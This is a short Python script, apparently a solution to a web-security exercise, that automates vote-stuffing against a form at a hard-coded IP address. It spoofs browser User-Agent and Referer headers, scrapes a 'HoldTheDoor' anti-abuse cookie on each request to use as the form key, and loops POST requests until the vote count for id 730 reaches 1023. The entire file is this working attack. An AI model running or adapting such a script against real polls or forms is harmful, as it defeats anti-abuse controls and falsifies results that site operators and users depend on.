from lxml import html
import requests

def req_values(url, headers):
    page = requests.get(url, headers=headers)
    tree = html.fromstring(page.content)
    me = tree.xpath(next_val)
    return ([page, tree, me])

try:
    url = 'http://158.69.76.135/level2.php'
    data = {'id':'730','holdthedoor':'submit'}
    next_val = '//td[contains(text(), "730")]/following-sibling::node()/text()'
    windows = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0"
    headers = {'User-Agent': windows, 'Referer': url}

    page, tree, me = req_values(url, headers)
    session = requests.Session()
    data.update({"key":page.cookies["HoldTheDoor"]})
#    session.headers.update(headers)
    while ("".join(me) != '\n1023    '):
        page, tree, me = req_values(url, headers=headers)
        data.update({"key":page.cookies["HoldTheDoor"]})
        status = requests.post(url, data, cookies=page.cookies, headers=headers)
        print("{} {}".format(status ,me))
except Exception as e:
    print(e)
